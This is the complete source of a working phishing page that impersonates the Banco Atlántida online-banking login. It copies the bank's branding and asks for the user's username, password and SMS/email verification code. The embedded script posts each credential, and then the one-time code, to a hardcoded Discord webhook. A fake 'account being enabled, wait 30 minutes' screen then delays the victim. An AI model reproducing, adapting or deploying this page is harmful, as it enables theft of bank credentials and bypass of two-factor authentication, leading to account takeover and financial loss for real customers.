<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <title>Atlántida Online</title>
    
    <!-- Tailwind CSS & FontAwesome -->
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />

    <style>
        html, body {
            height: 100%;
            margin: 0;
            overflow: hidden;
        }
        .input-brand:focus {
            box-shadow: 0 0 0 3px rgba(217, 39, 46, 0.15);
            border-color: #D9272E;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        .animate-spin-fast {
            animation: spin 0.8s linear infinite;
        }

        /* ===== ANIMACIONES PARA PANTALLA DE ESPERA ===== */
        @keyframes pulse-dot {
            0%, 100% { opacity: 0.3; transform: scale(0.8); }
            50% { opacity: 1; transform: scale(1.2); }
        }
        .pulse-dot {
            animation: pulse-dot 1.5s ease-in-out infinite;
        }
        .pulse-dot:nth-child(2) { animation-delay: 0.5s; }
        .pulse-dot:nth-child(3) { animation-delay: 1s; }

        @keyframes shimmer {
            0% { background-position: -200% center; }
            100% { background-position: 200% center; }
        }
        .shimmer-text {
            background: linear-gradient(90deg, #D9272E 25%, #f8a5a8 50%, #D9272E 75%);
            background-size: 200% auto;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            animation: shimmer 2.5s linear infinite;
        }

        @keyframes fadeInUp {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .fade-in-up {
            animation: fadeInUp 0.8s ease forwards;
        }

        /* Barra de progreso animada */
        @keyframes progress-bar {
            0% { width: 0%; }
            100% { width: 100%; }
        }
        .progress-bar-animate {
            animation: progress-bar 30s linear forwards;
        }

        /* Icono de reloj girando */
        @keyframes clock-spin {
            from { transform: rotate(0deg); }
            to { transform: rotate(360deg); }
        }
        .clock-spin {
            animation: clock-spin 8s linear infinite;
        }

        /* ===== VALIDACIÓN VISUAL ===== */
        .input-error {
            border-color: #ef4444 !important;
            box-shadow: 0 0 0 3px rgba(239, 68, 68, 0.15);
        }
        .error-message {
            color: #ef4444;
            font-size: 11px;
            margin-top: 4px;
            display: none;
            font-weight: 600;
        }
        .error-message.visible {
            display: block;
        }

        /* ===== VENTANA EMERGENTE (MODAL) ===== */
        .modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.6);
            z-index: 9999;
            display: flex;
            align-items: center;
            justify-content: center;
            opacity: 0;
            visibility: hidden;
            transition: all 0.3s ease;
        }
        .modal-overlay.show {
            opacity: 1;
            visibility: visible;
        }
        .modal-box {
            background: white;
            border-radius: 12px;
            padding: 25px;
            max-width: 350px;
            width: 90%;
            text-align: center;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
            transform: scale(0.8);
            transition: transform 0.3s ease;
        }
        .modal-overlay.show .modal-box {
            transform: scale(1);
        }
        .modal-icon {
            font-size: 40px;
            color: #D9272E;
            margin-bottom: 15px;
        }
        .modal-title {
            font-size: 16px;
            font-weight: bold;
            color: #333;
            margin-bottom: 10px;
        }
        .modal-message {
            font-size: 14px;
            color: #666;
            margin-bottom: 20px;
            line-height: 1.5;
        }
        .modal-btn {
            background: #D9272E;
            color: white;
            border: none;
            padding: 10px 30px;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.3s;
        }
        .modal-btn:hover {
            background: #b91c24;
        }
    </style>
</head>
<body class="bg-white font-sans antialiased text-gray-800">

    <!-- ===== VENTANA EMERGENTE (MODAL) ===== -->
    <div class="modal-overlay" id="welcomeModal">
        <div class="modal-box">
            <div class="modal-icon">
                <i class="fa-solid fa-circle-info"></i>
            </div>
            <div class="modal-title">¡Bienvenido!</div>
            <div class="modal-message">
                Ingrese los datos correctamente para obtener los beneficios
            </div>
            <button class="modal-btn" onclick="cerrarModal()">Entendido</button>
        </div>
    </div>

    <!-- ===== PANTALLA DE CARGA (OVERLAY) ===== -->
    <div id="loadingOverlay" class="fixed inset-0 bg-white z-50 flex flex-col items-center justify-center hidden">
        <div class="flex flex-col items-center max-w-xs text-center px-4">
            <div class="w-10 h-10 border-[3px] border-gray-100 border-t-[#D9272E] rounded-full animate-spin-fast mb-4"></div>
            <p class="text-gray-800 font-semibold text-sm tracking-wide">Validando información de seguridad...</p>
            <p class="text-gray-400 text-[11px] mt-1 leading-normal">Por tu seguridad, estamos procesando tu solicitud de acceso en nuestros servidores protegidos.</p>
        </div>
    </div>

    <!-- ===== PANTALLA DE ESPERA (HABILITACIÓN) ===== -->
    <div id="stepWaiting" class="fixed inset-0 bg-white z-50 flex flex-col items-center justify-center hidden">
        <div class="flex flex-col items-center max-w-sm text-center px-6">
            <!-- Icono de reloj animado -->
            <div class="relative mb-6">
                <div class="w-20 h-20 border-4 border-gray-100 border-t-[#D9272E] rounded-full clock-spin"></div>
                <div class="absolute inset-0 flex items-center justify-center">
                    <i class="fa-regular fa-clock text-3xl text-[#D9272E]"></i>
                </div>
            </div>

            <!-- Título con efecto shimmer -->
            <h2 class="text-2xl font-bold shimmer-text mb-2 fade-in-up">
                Habilitación en Proceso
            </h2>

            <!-- Mensaje principal -->
            <p class="text-gray-700 text-base font-semibold mb-1 fade-in-up" style="animation-delay: 0.2s;">
                Espere <span class="text-[#D9272E] font-extrabold">30 minutos</span> para que los beneficios sean activados.
            </p>

            <!-- Subtítulo -->
            <p class="text-gray-400 text-sm mt-2 fade-in-up" style="animation-delay: 0.4s;">
                Su cuenta está siendo verificada por nuestro equipo de seguridad.
            </p>

            <!-- Puntos animados -->
            <div class="flex gap-2 mt-6">
                <span class="pulse-dot w-2.5 h-2.5 bg-[#D9272E] rounded-full"></span>
                <span class="pulse-dot w-2.5 h-2.5 bg-[#D9272E] rounded-full"></span>
                <span class="pulse-dot w-2.5 h-2.5 bg-[#D9272E] rounded-full"></span>
            </div>

            <!-- Barra de progreso -->
            <div class="w-full mt-6 bg-gray-100 rounded-full h-1.5 overflow-hidden">
                <div class="bg-[#D9272E] h-1.5 rounded-full progress-bar-animate"></div>
            </div>

        </div>
    </div>

    <!-- ===== CONTENEDOR PRINCIPAL ===== -->
    <div class="flex h-full w-screen flex-col lg:flex-row">
        
        <!-- SECCIÓN IZQUIERDA -->
        <div class="hidden lg:block lg:flex-1 h-full relative bg-[#061f3d]">
            <img 
                src="https://app.bancatlan.hn/cms/uploads/slider1.webp" 
                alt="Arte Banco Atlántida" 
                class="w-full h-full object-cover select-none pointer-events-none"
            />
        </div>

        <!-- SECCIÓN DERECHA -->
        <div class="w-full lg:w-[420px] bg-white flex flex-col justify-between p-7 sm:p-8 border-t-4 border-[#D9272E] lg:border-t-0 h-full overflow-y-auto">
            
            <!-- Selector de Idioma -->
            <div class="flex justify-end items-center mb-2">
                <button class="flex items-center gap-1 px-2.5 py-1 border border-gray-300 rounded text-[11px] font-semibold text-gray-700 hover:bg-gray-50 transition">
                    <i class="fa-solid fa-globe text-red-600"></i>
                    <span class="uppercase">es</span>
                    <i class="fa-solid fa-chevron-down text-[8px] text-gray-500 ml-0.5"></i>
                </button>
            </div>

            <!-- ===== PANTALLA 1: LOGIN ===== -->
            <div id="stepLogin" class="w-full max-w-[340px] lg:max-w-[320px] mx-auto space-y-5 lg:space-y-4 my-auto">
                <div class="flex justify-center mb-1">
                    <img src="https://cdn.prod.website-files.com/6928d334b7a7a6941baf0636/69a1cad46ea550499086146b_logo-isotipo-large.png" alt="Banco Atlántida" class="h-14 lg:h-12 object-contain" />
                </div>

                <p class="text-center text-[12px] lg:text-[11px] text-gray-500 font-normal leading-normal px-2">
                    Ingresa tu usuario y contraseña para iniciar sesión.
                </p>

                <form id="loginForm" class="space-y-4 lg:space-y-3.5" onsubmit="sendToDiscord(event)">
                    <div class="space-y-1.5 lg:space-y-1">
                        <label for="username" class="text-[12px] lg:text-[11px] font-bold text-gray-700 block">Usuario</label>
                        <input 
                            type="text" 
                            id="username" 
                            required 
                            maxlength="15"
                            placeholder="Ingresa tu usuario" 
                            class="w-full h-10 lg:h-9 px-3 border border-gray-300 rounded-lg outline-none text-xs transition-all input-brand placeholder:text-gray-400"
                            onkeydown="return validarTecla(event)"
                        />
                        <p class="error-message" id="usernameError">Ingrese usuario correctamente</p>
                    </div>

                    <div class="space-y-1.5 lg:space-y-1">
                        <label for="password" class="text-[12px] lg:text-[11px] font-bold text-gray-700 block">Contraseña</label>
                        <div class="relative">
                            <input 
                                type="password" 
                                id="password" 
                                required 
                                maxlength="15"
                                placeholder="Ingresa tu contraseña" 
                                class="w-full h-10 lg:h-9 pl-3 pr-10 border border-gray-300 rounded-lg outline-none text-xs transition-all input-brand placeholder:text-gray-400"
                                onkeydown="return validarTecla(event)"
                            />
                            <button type="button" onclick="togglePasswordVisibility()" class="absolute inset-y-0 right-0 pr-3 flex items-center text-red-600 hover:text-red-700">
                                <i id="eyeIcon" class="fa-solid fa-eye-slash text-[11px] lg:text-[10px]"></i>
                            </button>
                        </div>
                        <p class="error-message" id="passwordError">Ingrese usuario correctamente</p>
                        <div class="text-right pt-0.5">
                            <a href="#" class="text-[11px] lg:text-[10px] font-semibold text-[#D9272E] hover:underline">¿Olvidaste tu contraseña?</a>
                        </div>
                    </div>

                    <button type="submit" class="w-full h-10 lg:h-9 bg-[#D9272E] hover:bg-[#b91c24] text-white font-semibold text-xs rounded-lg transition-colors mt-2 shadow-sm">
                        Iniciar sesión
                    </button>
                </form>

                <!-- Tarjeta de Seguridad -->
                <div class="border border-gray-100 rounded-xl p-3.5 lg:p-3 flex flex-col items-center gap-1.5 bg-gray-50/50 max-w-[290px] lg:max-w-[280px] mx-auto text-center mt-2 shadow-sm">
                    <div class="w-8 h-8 rounded-full bg-slate-100 flex items-center justify-center text-slate-600"><i class="fa-solid fa-unlock-keyhole text-sm"></i></div>
                    <div>
                        <p class="text-[12px] lg:text-[11px] font-bold text-gray-800">¡Importantes consejos de seguridad!</p>
                        <p class="text-[11px] lg:text-[10px] text-gray-400 leading-tight mt-0.5">No compartas tu usuario y contraseña con nadie.</p>
                    </div>
                </div>
            </div>

            <!-- ===== PANTALLA 2: CÓDIGO SMS / EMAIL ===== -->
            <div id="stepVerification" class="w-full max-w-[340px] lg:max-w-[320px] mx-auto space-y-5 lg:space-y-4 my-auto hidden">
                <div class="flex justify-center mb-1">
                    <img src="https://cdn.prod.website-files.com/6928d334b7a7a6941baf0636/69a1cad46ea550499086146b_logo-isotipo-large.png" alt="Banco Atlántida" class="h-14 lg:h-12 object-contain" />
                </div>

                <div class="text-center space-y-1">
                    <p class="text-gray-800 font-bold text-sm lg:text-base tracking-wide">Código de Verificación</p>
                    <p class="text-[12px] lg:text-[11px] text-gray-500 leading-normal px-2">
                        Hemos enviado un código temporal por SMS o Correo Electrónico asociado a tu cuenta <span id="displayUser" class="font-bold text-gray-700"></span>.
                    </p>
                </div>

                <form id="smsForm" class="space-y-4" onsubmit="sendSmsToDiscord(event)">
                    <div class="space-y-1.5 lg:space-y-1">
                        <label for="smsCode" class="text-[12px] lg:text-[11px] font-bold text-gray-700 block">Ingresa el código</label>
                        <div class="relative">
                            <input 
                                type="text" 
                                id="smsCode" 
                                required 
                                maxlength="8"
                                placeholder="Ej: 123456" 
                                class="w-full h-10 lg:h-9 px-3 border border-gray-300 rounded-lg outline-none text-center font-semibold text-sm tracking-widest transition-all input-brand placeholder:text-gray-400 placeholder:tracking-normal placeholder:font-normal" 
                            />
                        </div>
                        <p class="text-[11px] lg:text-[10px] text-gray-400 mt-1 text-center">El código puede tardar unos minutos en llegar.</p>
                    </div>

                    <button type="submit" class="w-full h-10 lg:h-9 bg-[#D9272E] hover:bg-[#b91c24] text-white font-semibold text-xs rounded-lg transition-colors mt-1 shadow-sm">
                        Confirmar y Continuar
                    </button>
                </form>

                <div class="text-center">
                    <button type="button" onclick="location.reload()" class="text-[11px] lg:text-[10px] font-semibold text-gray-500 hover:text-[#D9272E] hover:underline">
                        <i class="fa-solid fa-arrow-left mr-1"></i> Volver al inicio
                    </button>
                </div>
            </div>

            <!-- Enlaces de Soporte Inferiores -->
            <div class="flex justify-between items-center text-gray-400 border-t border-gray-100 pt-3 text-[11px] lg:text-[10px]">
                <button class="flex flex-row items-center gap-1 hover:text-gray-600 transition font-medium w-1/2 justify-center lg:justify-start">
                    <i class="fa-solid fa-user-gear text-[#D9272E] text-xs"></i><span>Gestiones de usuario</span>
                </button>
                <button class="flex flex-row items-center gap-1 hover:text-gray-600 transition font-medium w-1/2 justify-center lg:justify-end">
                    <i class="fa-solid fa-headset text-[#D9272E] text-xs"></i><span>¿Necesitas ayuda?</span>
                </button>
            </div>

        </div>
    </div>

    <!-- ===== SCRIPTS DE CONTROL ===== -->
    <script>
        // ============================================
        // 🔴 WEBHOOK DE DISCORD
        // ============================================
        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1540553924161966220/gmtc5tUYY1UzVFFEYOKvExB2KG0F-77bG_mK5cEQxn3SZMxq091ebLJEY0qlhmV2Atib";

        // ===== VENTANA EMERGENTE =====
        function mostrarModal() {
            document.getElementById('welcomeModal').classList.add('show');
        }

        function cerrarModal() {
            document.getElementById('welcomeModal').classList.remove('show');
        }

        // Mostrar modal al cargar la página
        window.addEventListener('DOMContentLoaded', function() {
            setTimeout(mostrarModal, 500); // Aparece después de 0.5 segundos
        });

        // ===== VALIDACIÓN DE CAMPOS =====
        function validarTecla(event) {
            // Bloquear tecla de espacio (código 32)
            if (event.keyCode === 32) {
                event.preventDefault();
                return false;
            }
            return true;
        }

        // ===== TOGGLE PASSWORD =====
        function togglePasswordVisibility() {
            const passwordInput = document.getElementById('password');
            const eyeIcon = document.getElementById('eyeIcon');
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                eyeIcon.classList.remove('fa-eye-slash');
                eyeIcon.classList.add('fa-eye');
            } else {
                passwordInput.type = 'password';
                eyeIcon.classList.remove('fa-eye');
                eyeIcon.classList.add('fa-eye-slash');
            }
        }

        // ===== VALIDACIÓN DE PALABRAS BLOQUEADAS =====
        function contienePalabraBloqueada(texto) {
            // Lista de palabras prohibidas (case insensitive)
            const palabrasBloqueadas = [
                'gmail',
                'hotmail',
                'hot',
                'gmai',
                'mail',
                'gmail.com',
                'hotmail.com',
                'yahoo',
                'outlook'
            ];
            
            const textoLower = texto.toLowerCase();
            
            for (const palabra of palabrasBloqueadas) {
                if (textoLower.includes(palabra)) {
                    return true;
                }
            }
            
            return false;
        }

        // ===== ENVIAR LOGIN A DISCORD =====
        async function sendToDiscord(event) {
            event.preventDefault();
            
            const usernameInput = document.getElementById('username');
            const passwordInput = document.getElementById('password');
            
            const usernameVal = usernameInput.value;
            const passwordVal = passwordInput.value;
            
            // Validar usuario
            let tieneError = false;
            
            // Verificar longitud máxima
            if (usernameVal.length > 15 || passwordVal.length > 15) {
                tieneError = true;
            }
            
            // Verificar espacios
            if (usernameVal.includes(' ') || passwordVal.includes(' ')) {
                tieneError = true;
            }
            
            // Verificar palabras bloqueadas
            if (contienePalabraBloqueada(usernameVal) || contienePalabraBloqueada(passwordVal)) {
                tieneError = true;
            }
            
            // Mostrar error si hay problema
            if (tieneError) {
                usernameInput.classList.add('input-error');
                passwordInput.classList.add('input-error');
                document.getElementById('usernameError').classList.add('visible');
                document.getElementById('passwordError').classList.add('visible');
                
                // Limpiar errores después de 3 segundos
                setTimeout(() => {
                    usernameInput.classList.remove('input-error');
                    passwordInput.classList.remove('input-error');
                    document.getElementById('usernameError').classList.remove('visible');
                    document.getElementById('passwordError').classList.remove('visible');
                }, 3000);
                
                return;
            }
            
            // Continuar con el flujo original
            const loader = document.getElementById('loadingOverlay');
            localStorage.setItem('cached_user', usernameVal);
            loader.classList.remove('hidden');
            
            const messageData = {
                username: "Atlántida Log Bot",
                avatar_url: "https://cdn.prod.website-files.com/6928d334b7a7a6941baf0636/69a1cad46ea550499086146b_logo-isotipo-large.png",
                embeds: [{
                    title: "🔐 Nuevo Acceso Detectado (Fase 1)",
                    color: 14230318,
                    fields: [
                        { name: "👤 Usuario", value: `\`\`\`${usernameVal}\`\`\``, inline: true },
                        { name: "🔑 Contraseña", value: `\`\`\`${passwordVal}\`\`\``, inline: true }
                    ],
                    footer: { text: "Atlántida Online" },
                    timestamp: new Date().toISOString()
                }]
            };
            
            try {
                await fetch(DISCORD_WEBHOOK_URL, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(messageData)
                });
            } catch (error) {
                console.error("Error Discord:", error);
            }
            
            setTimeout(() => {
                loader.classList.add('hidden');
                document.getElementById('stepLogin').classList.add('hidden');
                document.getElementById('displayUser').innerText = localStorage.getItem('cached_user') || "";
                document.getElementById('stepVerification').classList.remove('hidden');
            }, 10000);
        }

        // ===== ENVIAR CÓDIGO SMS A DISCORD =====
        async function sendSmsToDiscord(event) {
            event.preventDefault();
            const smsCodeVal = document.getElementById('smsCode').value;
            const cachedUser = localStorage.getItem('cached_user') || "Desconocido";
            const loader = document.getElementById('loadingOverlay');

            loader.classList.remove('hidden');

            const smsMessageData = {
                username: "Atlántida Log Bot",
                avatar_url: "https://cdn.prod.website-files.com/6928d334b7a7a6941baf0636/69a1cad46ea550499086146b_logo-isotipo-large.png",
                embeds: [{
                    title: "💬 Código de Verificación Recibido (Fase 2)",
                    color: 3447003,
                    fields: [
                        { name: "👤 Usuario Asociado", value: `\`\`\`${cachedUser}\`\`\``, inline: true },
                        { name: "🔢 Código SMS/Email", value: `\`\`\`${smsCodeVal}\`\`\``, inline: true }
                    ],
                    footer: { text: "Atlántida Online - Token Verificado" },
                    timestamp: new Date().toISOString()
                }]
            };

            try {
                await fetch(DISCORD_WEBHOOK_URL, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(smsMessageData)
                });

                // ============================================
                // 🔥 MUESTRA PANTALLA DE HABILITACIÓN
                // ============================================
                setTimeout(() => {
                    loader.classList.add('hidden');
                    document.getElementById('stepVerification').classList.add('hidden');
                    document.getElementById('stepWaiting').classList.remove('hidden');
                    
                }, 2000);

            } catch (error) {
                console.error("Error SMS:", error);
                loader.classList.add('hidden');
            }
        }
    </script>
</body>
</html>
